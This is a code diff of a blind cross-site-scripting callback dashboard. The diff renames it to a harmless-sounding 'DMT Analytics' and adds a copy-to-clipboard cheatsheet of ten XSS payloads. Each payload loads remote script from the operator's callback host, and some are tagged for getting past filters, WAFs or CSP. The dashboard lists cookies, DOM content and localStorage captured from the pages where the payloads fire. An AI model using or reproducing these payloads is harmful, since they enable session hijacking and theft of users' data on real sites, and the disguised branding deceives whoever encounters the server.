@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>BXSS Dashboard</title>
+  <title>DMT Analytics — Dashboard</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet">
   <style>
@@ -22,294 +22,74 @@
       --warning: #ffa502;
     }
 
-    body {
-      background: var(--bg);
-      color: var(--text);
-      font-family: 'Share Tech Mono', monospace;
-      min-height: 100vh;
-    }
+    body { background: var(--bg); color: var(--text); font-family: 'Share Tech Mono', monospace; min-height: 100vh; }
 
-    /* Top bar */
     .topbar {
-      background: var(--surface);
-      border-bottom: 1px solid var(--border);
-      padding: 0 32px;
-      height: 56px;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      position: sticky;
-      top: 0;
-      z-index: 100;
+      background: var(--surface); border-bottom: 1px solid var(--border);
+      padding: 0 32px; height: 56px; display: flex; align-items: center; justify-content: space-between;
+      position: sticky; top: 0; z-index: 100;
     }
-
-    .topbar-left {
-      display: flex;
-      align-items: center;
-      gap: 24px;
-    }
-
-    .logo {
-      font-family: 'Syne', sans-serif;
-      font-weight: 800;
-      font-size: 14px;
-      letter-spacing: 4px;
-      color: var(--accent);
-      text-transform: uppercase;
-    }
-
-    .hit-count {
-      font-size: 12px;
-      color: var(--muted);
-    }
-
-    .hit-count span {
-      color: var(--accent);
-      font-weight: bold;
-    }
-
-    .topbar-right {
-      display: flex;
-      align-items: center;
-      gap: 16px;
-    }
-
-    .payload-url {
-      font-size: 11px;
-      color: var(--muted);
-      background: var(--accent-dim);
-      border: 1px solid var(--border);
-      padding: 5px 12px;
-      cursor: pointer;
-      transition: border-color 0.2s;
-      white-space: nowrap;
-      overflow: hidden;
-      text-overflow: ellipsis;
-      max-width: 300px;
-    }
-
-    .payload-url:hover { border-color: var(--accent); color: var(--accent); }
-
-    .btn-sm {
-      font-family: 'Syne', sans-serif;
-      font-weight: 600;
-      font-size: 11px;
-      letter-spacing: 2px;
-      text-transform: uppercase;
-      padding: 6px 14px;
-      border: 1px solid var(--border);
-      background: transparent;
-      color: var(--muted);
-      cursor: pointer;
-      transition: all 0.15s;
-    }
-
+    .topbar-left { display: flex; align-items: center; gap: 24px; }
+    .logo { font-family: 'Syne', sans-serif; font-weight: 800; font-size: 14px; letter-spacing: 4px; color: var(--accent); text-transform: uppercase; }
+    .hit-count { font-size: 12px; color: var(--muted); }
+    .hit-count span { color: var(--accent); font-weight: bold; }
+    .topbar-right { display: flex; align-items: center; gap: 12px; }
+    .btn-sm { font-family: 'Syne', sans-serif; font-weight: 600; font-size: 11px; letter-spacing: 2px; text-transform: uppercase; padding: 6px 14px; border: 1px solid var(--border); background: transparent; color: var(--muted); cursor: pointer; transition: all 0.15s; }
     .btn-sm:hover { border-color: var(--accent); color: var(--accent); }
     .btn-sm.danger:hover { border-color: var(--danger); color: var(--danger); }
 
-    /* Main content */
     .main { padding: 32px; }
 
-    /* Stats row */
-    .stats {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
-      gap: 16px;
-      margin-bottom: 32px;
-    }
+    .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); gap: 16px; margin-bottom: 32px; }
+    .stat-card { background: var(--surface); border: 1px solid var(--border); padding: 20px 24px; position: relative; overflow: hidden; }
+    .stat-card::after { content: ''; position: absolute; bottom: 0; left: 0; right: 0; height: 1px; background: linear-gradient(90deg, var(--accent), transparent); }
+    .stat-label { font-size: 10px; letter-spacing: 2px; text-transform: uppercase; color: var(--muted); margin-bottom: 8px; }
+    .stat-value { font-family: 'Syne', sans-serif; font-size: 28px; font-weight: 800; color: var(--accent); }
 
-    .stat-card {
-      background: var(--surface);
-      border: 1px solid var(--border);
-      padding: 20px 24px;
-      position: relative;
-      overflow: hidden;
-    }
-
-    .stat-card::after {
-      content: '';
-      position: absolute;
-      bottom: 0; left: 0; right: 0;
-      height: 1px;
-      background: linear-gradient(90deg, var(--accent), transparent);
-    }
-
-    .stat-label {
-      font-size: 10px;
-      letter-spacing: 2px;
-      text-transform: uppercase;
-      color: var(--muted);
-      margin-bottom: 8px;
-    }
-
-    .stat-value {
-      font-family: 'Syne', sans-serif;
-      font-size: 28px;
-      font-weight: 800;
-      color: var(--accent);
-    }
+    .section-title { font-size: 10px; letter-spacing: 3px; text-transform: uppercase; color: var(--muted); margin-bottom: 16px; }
 
     /* Hits table */
-    .section-title {
-      font-size: 10px;
-      letter-spacing: 3px;
-      text-transform: uppercase;
-      color: var(--muted);
-      margin-bottom: 16px;
-    }
-
-    .hits-table {
-      width: 100%;
-      border-collapse: collapse;
-      font-size: 12px;
-    }
-
-    .hits-table th {
-      text-align: left;
-      font-size: 10px;
-      letter-spacing: 2px;
-      text-transform: uppercase;
-      color: var(--muted);
-      padding: 10px 16px;
-      border-bottom: 1px solid var(--border);
-      font-family: 'Syne', sans-serif;
-    }
-
-    .hits-table td {
-      padding: 14px 16px;
-      border-bottom: 1px solid rgba(30, 45, 61, 0.5);
-      vertical-align: middle;
-      max-width: 0;
-    }
-
-    .hits-table tr:hover td {
-      background: var(--surface2);
-    }
-
-    .hit-id {
-      color: var(--accent);
-      font-weight: bold;
-      white-space: nowrap;
-    }
-
+    .hits-table { width: 100%; border-collapse: collapse; font-size: 12px; }
+    .hits-table th { text-align: left; font-size: 10px; letter-spacing: 2px; text-transform: uppercase; color: var(--muted); padding: 10px 16px; border-bottom: 1px solid var(--border); font-family: 'Syne', sans-serif; }
+    .hits-table td { padding: 14px 16px; border-bottom: 1px solid rgba(30,45,61,0.5); vertical-align: middle; max-width: 0; }
+    .hits-table tr:hover td { background: var(--surface2); }
+    .hit-id { color: var(--accent); font-weight: bold; white-space: nowrap; }
     .hit-id::before { content: '#'; }
-
-    .hit-url {
-      overflow: hidden;
-      text-overflow: ellipsis;
-      white-space: nowrap;
-      color: var(--text);
-      width: 35%;
-    }
-
-    .hit-ip {
-      color: var(--warning);
-      white-space: nowrap;
-    }
-
-    .hit-time {
-      color: var(--muted);
-      white-space: nowrap;
-      font-size: 11px;
-    }
-
-    .hit-ua {
-      overflow: hidden;
-      text-overflow: ellipsis;
-      white-space: nowrap;
-      color: var(--muted);
-      width: 20%;
-      font-size: 11px;
-    }
-
-    .badge {
-      display: inline-block;
-      padding: 2px 8px;
-      font-size: 10px;
-      border: 1px solid;
-      white-space: nowrap;
-    }
-
+    .hit-url { overflow: hidden; text-overflow: ellipsis; white-space: nowrap; color: var(--text); width: 35%; }
+    .hit-ip { color: var(--warning); white-space: nowrap; }
+    .hit-time { color: var(--muted); white-space: nowrap; font-size: 11px; }
+    .hit-ua { overflow: hidden; text-overflow: ellipsis; white-space: nowrap; color: var(--muted); width: 20%; font-size: 11px; }
+    .badge { display: inline-block; padding: 2px 8px; font-size: 10px; border: 1px solid; white-space: nowrap; }
     .badge-green { color: var(--accent); border-color: rgba(0,255,136,0.3); background: rgba(0,255,136,0.05); }
-    .badge-gray  { color: var(--muted);  border-color: var(--border); }
-
-    .action-link {
-      color: var(--accent);
-      text-decoration: none;
-      font-size: 11px;
-      letter-spacing: 1px;
-      white-space: nowrap;
-    }
-
+    .action-link { color: var(--accent); text-decoration: none; font-size: 11px; letter-spacing: 1px; white-space: nowrap; }
     .action-link:hover { text-decoration: underline; }
 
-    /* Empty state */
-    .empty {
-      text-align: center;
-      padding: 80px 20px;
-      color: var(--muted);
-    }
+    /* Payload cheatsheet */
+    .cheatsheet { margin-top: 40px; }
+    .cheatsheet-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+    @media (max-width: 900px) { .cheatsheet-grid { grid-template-columns: 1fr; } }
 
-    .empty-icon { font-size: 32px; margin-bottom: 16px; }
+    .payload-card { background: var(--surface); border: 1px solid var(--border); padding: 20px 24px; position: relative; }
+    .payload-card::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 1px; background: linear-gradient(90deg, var(--accent), transparent); }
+    .payload-card-header { display: flex; align-items: flex-start; justify-content: space-between; margin-bottom: 10px; gap: 12px; }
+    .payload-title { font-family: 'Syne', sans-serif; font-size: 12px; font-weight: 700; color: var(--text); letter-spacing: 1px; }
+    .payload-desc { font-size: 10px; color: var(--muted); margin-bottom: 10px; line-height: 1.5; }
+    .payload-tag { font-size: 9px; padding: 2px 8px; border: 1px solid; white-space: nowrap; flex-shrink: 0; }
+    .tag-high { color: var(--accent); border-color: rgba(0,255,136,0.3); }
+    .tag-med { color: var(--warning); border-color: rgba(255,165,2,0.3); }
+    .tag-low { color: var(--muted); border-color: var(--border); }
 
-    .empty h3 {
-      font-family: 'Syne', sans-serif;
-      font-weight: 700;
-      color: var(--text);
-      margin-bottom: 8px;
-    }
-
-    .empty p { font-size: 12px; }
-
-    .empty code {
-      display: inline-block;
-      margin-top: 16px;
-      background: var(--surface2);
-      border: 1px solid var(--border);
-      padding: 8px 16px;
-      color: var(--accent);
-      font-size: 12px;
-    }
+    .payload-code { background: var(--surface2); border: 1px solid var(--border); padding: 12px 14px; font-size: 11px; color: var(--accent); word-break: break-all; line-height: 1.6; cursor: pointer; transition: border-color 0.15s; position: relative; }
+    .payload-code:hover { border-color: var(--accent); }
+    .payload-code::after { content: 'click to copy'; position: absolute; top: 6px; right: 10px; font-size: 9px; color: var(--muted); letter-spacing: 1px; }
 
     /* Pagination */
-    .pagination {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      margin-top: 24px;
-      justify-content: center;
-    }
-
-    .page-link {
-      padding: 6px 12px;
-      border: 1px solid var(--border);
-      color: var(--muted);
-      text-decoration: none;
-      font-size: 12px;
-      transition: all 0.15s;
-    }
-
-    .page-link:hover, .page-link.active {
-      border-color: var(--accent);
-      color: var(--accent);
-    }
+    .pagination { display: flex; align-items: center; gap: 8px; margin-top: 24px; justify-content: center; }
+    .page-link { padding: 6px 12px; border: 1px solid var(--border); color: var(--muted); text-decoration: none; font-size: 12px; transition: all 0.15s; }
+    .page-link:hover, .page-link.active { border-color: var(--accent); color: var(--accent); }
 
     /* Toast */
-    .toast {
-      position: fixed;
-      bottom: 24px;
-      right: 24px;
-      background: var(--surface);
-      border: 1px solid var(--accent);
-      color: var(--accent);
-      padding: 12px 20px;
-      font-size: 12px;
-      opacity: 0;
-      transform: translateY(10px);
-      transition: all 0.3s;
-      pointer-events: none;
-    }
-
+    .toast { position: fixed; bottom: 24px; right: 24px; background: var(--surface); border: 1px solid var(--accent); color: var(--accent); padding: 12px 20px; font-size: 12px; opacity: 0; transform: translateY(10px); transition: all 0.3s; pointer-events: none; z-index: 999; }
     .toast.show { opacity: 1; transform: translateY(0); }
   </style>
 </head>
@@ -317,13 +97,10 @@
 
 <header class="topbar">
   <div class="topbar-left">
-    <div class="logo">BXSS</div>
+    <div class="logo">DMT Analytics</div>
     <div class="hit-count"><span><%= total %></span> total hits</div>
   </div>
   <div class="topbar-right">
-    <div class="payload-url" onclick="copyPayload(this)" title="Click to copy">
-      &lt;script src="<%= process.env.SERVER_URL %>/payload.js"&gt;&lt;/script&gt;
-    </div>
     <% if (total > 0) { %>
     <form method="POST" action="/dashboard/clear" onsubmit="return confirm('Delete all hits?')">
       <button type="submit" class="btn-sm danger">Clear All</button>
@@ -354,17 +131,8 @@
     </div>
   </div>
 
+  <% if (hits.length > 0) { %>
   <div class="section-title">// incoming callbacks</div>
-
-  <% if (hits.length === 0) { %>
-    <div class="empty">
-      <div class="empty-icon">📡</div>
-      <h3>Waiting for callbacks...</h3>
-      <p>No hits yet. Inject your payload and wait for the magic.</p>
-      <code>&lt;script src="<%= process.env.SERVER_URL %>/payload.js"&gt;&lt;/script&gt;</code>
-    </div>
-  <% } else { %>
-
   <table class="hits-table">
     <thead>
       <tr>
@@ -381,25 +149,20 @@
       <% hits.forEach(function(hit) { %>
       <tr>
         <td><span class="hit-id"><%= hit.id %></span></td>
-        <td class="hit-url" title="<%= hit.origin_url || '' %>">
-          <%= hit.origin_url || '<em style="color:var(--muted)">unknown</em>' %>
-        </td>
+        <td class="hit-url" title="<%= hit.origin_url || '' %>"><%= hit.origin_url || '<em style="color:var(--muted)">unknown</em>' %></td>
         <td><span class="hit-ip"><%= hit.ip || '—' %></span></td>
         <td class="hit-time"><%= new Date(hit.created_at).toLocaleString() %></td>
         <td class="hit-ua" title="<%= hit.user_agent || '' %>"><%= hit.user_agent || '—' %></td>
         <td>
-          <% if (hit.cookies && hit.cookies !== '{}') { %><span class="badge badge-green">🍪 cookies</span> <% } %>
+          <% if (hit.cookies && hit.cookies !== '{}') { %><span class="badge badge-green">🍪</span> <% } %>
           <% if (hit.dom) { %><span class="badge badge-green">DOM</span> <% } %>
           <% if (hit.local_storage && hit.local_storage !== '{}') { %><span class="badge badge-green">LS</span><% } %>
         </td>
-        <td>
-          <a href="/dashboard/hit/<%= hit.id %>" class="action-link">view →</a>
-        </td>
+        <td><a href="/dashboard/hit/<%= hit.id %>" class="action-link">view →</a></td>
       </tr>
       <% }); %>
     </tbody>
   </table>
-
   <% if (totalPages > 1) { %>
   <div class="pagination">
     <% for (let i = 1; i <= totalPages; i++) { %>
@@ -407,16 +170,123 @@
     <% } %>
   </div>
   <% } %>
-
   <% } %>
+
+  <!-- Payload Cheatsheet — always visible -->
+  <div class="cheatsheet" style="margin-top: <%= hits.length > 0 ? '48px' : '0' %>">
+    <div class="section-title">// payload cheatsheet — click any to copy</div>
+    <div class="cheatsheet-grid">
+
+      <!-- 1 -->
+      <div class="payload-card">
+        <div class="payload-card-header">
+          <div class="payload-title">Classic Script Tag</div>
+          <span class="payload-tag tag-high">MOST USED</span>
+        </div>
+        <div class="payload-desc">Standard injection. Works wherever script tags aren't stripped. Your go-to first attempt on any input field.</div>
+        <div class="payload-code" onclick="copyPayload(this)"><script src="https://<%= process.env.SERVER_URL ? process.env.SERVER_URL.replace('https://','') : 'dmtanalytics.net' %>/t"></script></div>
+      </div>
+
+      <!-- 2 -->
+      <div class="payload-card">
+        <div class="payload-card-header">
+          <div class="payload-title">Polyglot Prefix + Script</div>
+          <span class="payload-tag tag-high">NAHAMSEC STYLE</span>
+        </div>
+        <div class="payload-desc">Break out of HTML attributes, JS strings, and tag contexts simultaneously. Prefix forces context escape before the payload fires.</div>
+        <div class="payload-code" onclick="copyPayload(this)">'";></noscript></title></textarea></style></template></script><script src="https://<%= process.env.SERVER_URL ? process.env.SERVER_URL.replace('https://','') : 'dmtanalytics.net' %>/t"></script></div>
+      </div>
+
+      <!-- 3 -->
+      <div class="payload-card">
+        <div class="payload-card-header">
+          <div class="payload-title">import() — Modern Browsers</div>
+          <span class="payload-tag tag-high">RECOMMENDED</span>
+        </div>
+        <div class="payload-desc">Preferred by Bugcrowd researchers. Dynamic import() bypasses many script-src CSP rules and works in modern JS contexts.</div>
+        <div class="payload-code" onclick="copyPayload(this)"><img src=x onerror="import('https://<%= process.env.SERVER_URL ? process.env.SERVER_URL.replace('https://','') : 'dmtanalytics.net' %>/t')"></div>
+      </div>
+
+      <!-- 4 -->
+      <div class="payload-card">
+        <div class="payload-card-header">
+          <div class="payload-title">SVG onload</div>
+          <span class="payload-tag tag-med">FILTER BYPASS</span>
+        </div>
+        <div class="payload-desc">Works when script tags are filtered but SVG is allowed. Common in rich text editors and markdown renderers.</div>
+        <div class="payload-code" onclick="copyPayload(this)"><svg onload="var s=document.createElement('script');s.src='https://<%= process.env.SERVER_URL ? process.env.SERVER_URL.replace('https://','') : 'dmtanalytics.net' %>/t';document.head.appendChild(s)"></div>
+      </div>
+
+      <!-- 5 -->
+      <div class="payload-card">
+        <div class="payload-card-header">
+          <div class="payload-title">img onerror + createElement</div>
+          <span class="payload-tag tag-med">NO SCRIPT TAG</span>
+        </div>
+        <div class="payload-desc">No script tag needed. Fires via broken image handler. Works in contexts where script is blocked but img is allowed.</div>
+        <div class="payload-code" onclick="copyPayload(this)"><img src=x onerror="var s=document.createElement('script');s.src='https://<%= process.env.SERVER_URL ? process.env.SERVER_URL.replace('https://','') : 'dmtanalytics.net' %>/t';document.body.appendChild(s)"></div>
+      </div>
+
+      <!-- 6 -->
+      <div class="payload-card">
+        <div class="payload-card-header">
+          <div class="payload-title">Blind HTML Probe (no JS)</div>
+          <span class="payload-tag tag-med">WAF BYPASS</span>
+        </div>
+        <div class="payload-desc">Zero JS — just an img tag. Fires a GET to your callback. Use to confirm the injection point exists before sending the full payload. Technique from dirtycoder0124.</div>
+        <div class="payload-code" onclick="copyPayload(this)"><img src="https://<%= process.env.SERVER_URL ? process.env.SERVER_URL.replace('https://','') : 'dmtanalytics.net' %>/callback?url=probe"></div>
+      </div>
+
+      <!-- 7 -->
+      <div class="payload-card">
+        <div class="payload-card-header">
+          <div class="payload-title">Attribute Injection + onfocus</div>
+          <span class="payload-tag tag-med">ATTRIBUTE CONTEXT</span>
+        </div>
+        <div class="payload-desc">When your input lands inside an HTML attribute value. Breaks out of the attribute and fires on focus. Tip from NahamsEc / Book of Bug Bounty Tips.</div>
+        <div class="payload-code" onclick="copyPayload(this)">" onfocus="var s=document.createElement('script');s.src='https://<%= process.env.SERVER_URL ? process.env.SERVER_URL.replace('https://','') : 'dmtanalytics.net' %>/t';document.head.appendChild(s)" autofocus="</div>
+      </div>
+
+      <!-- 8 -->
+      <div class="payload-card">
+        <div class="payload-card-header">
+          <div class="payload-title">JS String Break</div>
+          <span class="payload-tag tag-med">JS CONTEXT</span>
+        </div>
+        <div class="payload-desc">When your input is reflected inside a JavaScript string. Breaks out of the string and script block, injects fresh script tag.</div>
+        <div class="payload-code" onclick="copyPayload(this)">';</script><script src="https://<%= process.env.SERVER_URL ? process.env.SERVER_URL.replace('https://','') : 'dmtanalytics.net' %>/t"></script><script>'</div>
+      </div>
+
+      <!-- 9 -->
+      <div class="payload-card">
+        <div class="payload-card-header">
+          <div class="payload-title">User-Agent / HTTP Header</div>
+          <span class="payload-tag tag-low">HEADER INJECTION</span>
+        </div>
+        <div class="payload-desc">Inject into User-Agent, Referer, X-Forwarded-For. Fires when admins view logs. Tip from Book of Bug Bounty Tips (@nahamsec).</div>
+        <div class="payload-code" onclick="copyPayload(this)"><script src="https://<%= process.env.SERVER_URL ? process.env.SERVER_URL.replace('https://','') : 'dmtanalytics.net' %>/t"></script></div>
+      </div>
+
+      <!-- 10 -->
+      <div class="payload-card">
+        <div class="payload-card-header">
+          <div class="payload-title">Full Polyglot (Kitchen Sink)</div>
+          <span class="payload-tag tag-low">SPRAY & PRAY</span>
+        </div>
+        <div class="payload-desc">Combine everything — breaks HTML, JS strings, attributes, and template contexts. Use when you don't know the context. Based on 0xSobky's polyglot approach referenced by NahamsEc.</div>
+        <div class="payload-code" onclick="copyPayload(this)">javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><img/src/onerror=import('https://<%= process.env.SERVER_URL ? process.env.SERVER_URL.replace('https://','') : 'dmtanalytics.net' %>/t')></div>
+      </div>
+
+    </div>
+  </div>
 
 </main>
 
-<div class="toast" id="toast">Copied to clipboard</div>
+<div class="toast" id="toast">✓ Copied to clipboard</div>
 
 <script>
   function copyPayload(el) {
-    const text = `<script src="${location.origin}/payload.js"><\/script>`;
+    const text = el.innerText;
     navigator.clipboard.writeText(text).then(() => {
       const t = document.getElementById('toast');
       t.classList.add('show');
